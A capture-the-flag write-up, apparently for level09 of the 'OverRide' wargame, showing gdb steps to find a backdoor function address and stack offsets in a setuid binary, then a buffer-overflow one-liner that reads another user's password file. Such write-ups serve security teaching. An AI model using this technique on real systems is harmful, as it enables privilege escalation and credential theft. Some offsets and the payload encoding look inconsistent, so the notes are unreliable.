### step 1: Decompile with Ghydra

- Binary in 64-bits

```
level09@OverRide:~$ file level09 
level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
```

- Sources are available in `source.c`


### step 2: Code Analysis

- find secret backdoor function address : `0x000055555555488c`
```
gdb level09
info functions
```
- find eip of handle_msg : `0x7fffffffe5c8`
 
```
gdb level09
b handle_msg
 r
Starting program: /home/users/level09/level09 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------

Breakpoint 1, 0x00005555555548c4 in handle_msg ()
(gdb) info frame
Stack level 0, frame at 0x7fffffffe5d0:
 rip = 0x5555555548c4 in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe5e0
 Arglist at 0x7fffffffe5c0, args: 
 Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
 Saved registers:
  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
```

- find address of ref : 

Set breakpoint before the call of set_msg or set_username in handle_msg because the ref is passed as an argument to these functions so we can find the address in rax

```
gdb level09
start
disas handle_msg
b *0x0000555555554910
c
(gdb) x $rax
0x7fffffffe500:	0x0000000a
```

- find offset between ref and eip address
`0x7fffffffe5c8 - 0x7fffffffe500 = 200`

set_username
ecrit de ref + 140 à ref + 181

set_msg
ecrit de ref à ref + 180 ?








dépasse sur message au 128 eme char dans username
final string : 
(python -c 'print("a" * 120 + "")' ; python -c 'print("0x000055555555488c")'; echo 'cat /home/users/end/.pass'; cat) | ./level09
